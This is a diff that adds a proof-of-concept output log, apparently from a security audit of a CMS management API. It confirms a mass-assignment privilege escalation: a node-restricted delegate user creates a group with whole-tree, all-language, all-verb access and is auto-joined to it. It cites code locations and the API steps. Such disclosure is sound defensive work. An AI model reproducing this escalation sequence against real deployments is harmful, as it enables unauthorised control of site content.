@@ -1,0 +1,21 @@
+==============================================================================
+VULN-051: UserGroup mass-assignment → Users-delegate self-escalates to whole-tree/all-verb/all-language
+==============================================================================
+[INFO] target: http://localhost:29184
+[INFO] vulnerable code path: UserGroupPermissionService.cs:77-106 ValidateAccess (root -1 bypass :146-151) + UserGroupService.cs:747-758 auto-join
+[SETUP] admin authenticated to Management API
+[SETUP] D1 (in-scope) = 2cac54c2-8916-4f90-b86d-a8a57540bab8
+[SETUP] D2 (out-of-scope sibling) = b862373c-aae2-4e1f-b121-a4c5d3fafeae
+[SETUP] delegate group vge37a9a6e = 9df22f8e-59b3-4084-b1a2-853565d1ba03 (Users+Content, start node=D1, NO doc-root, read-only, NOT all-languages)
+[SETUP] delegate user lowuser_ec265a8f@example.invalid (uid=3a2193a6-c97f-4884-87e0-a610512c1fdb) created & password set
+[STEP] BEFORE (delegate effective access): hasDocumentRootAccess=False, hasMediaRootAccess=False, hasAccessToAllLanguages=False, docStartNodes=['2cac54c2-8916-4f90-b86d-a8a57540bab8'], fallbackPermissions=['Umb.Document.Read']
+[STEP] contrast: as delegate, create a group that includes the Settings section (delegate lacks it)
+[PROOF] section grant → HTTP 401 (blocked) — ValidateAccess enforces AllowedSections ⊆ caller
+[STEP] contrast: as delegate, create a group with documentStartNode = D2 (b862373c-aae2-4e1f-b121-a4c5d3fafeae) — a specific out-of-scope node
+[PROOF] specific out-of-scope node D2 → HTTP 401 (blocked, UnauthorizedMissingContentStartNodeAccess) — the per-node check DOES work
+[STEP] attack: as delegate, create a group with documentRootAccess=true (whole tree ⊃ D2), mediaRootAccess=true, elementRootAccess=true, hasAccessToAllLanguages=true, ALL document verbs
+[PROOF] escalation group ACCEPTED → HTTP 201, id=35f1eaa1-93bc-4fb0-afee-c977aa3b7eaa (whole-tree root access granted where a specific node in that tree was just refused)
+[PROOF] GET /user-group/35f1eaa1-93bc-4fb0-afee-c977aa3b7eaa: documentRootAccess=True, mediaRootAccess=True, hasAccessToAllLanguages=True, fallbackPermissions(count)=14
+[PROOF] admin GET /user/3a2193a6-c97f-4884-87e0-a610512c1fdb: delegate auto-joined to escalation group = True (CreateUserGroupController accepts no members — EnsureNonAdminUserIsInSavedUserGroup added the creator)
+[PROOF] AFTER (delegate effective access): hasDocumentRootAccess=True, hasMediaRootAccess=True, hasAccessToAllLanguages=True, fallbackPermissions=['Umb.Document.Create', 'Umb.Document.CultureAndHostnames', 'Umb.Document.Delete', 'Umb.Document.Duplicate', 'Umb.Document.Move', 'Umb.Document.Notifications', 'Umb.Document.Permissions', 'Umb.Document.PublicAccess', 'Umb.Document.Publish', 'Umb.Document.Read', 'Umb.Document.Rollback', 'Umb.Document.Sort', 'Umb.Document.Unpublish', 'Umb.Document.Update'] — effective privilege escalated false→true
+==> VULN-051: CONFIRMED — Users-delegate (confined to node D1) was refused node D2 yet granted+auto-joined a whole-tree/all-media/all-language/all-verb group ⊃ D2 = vertical privilege escalation
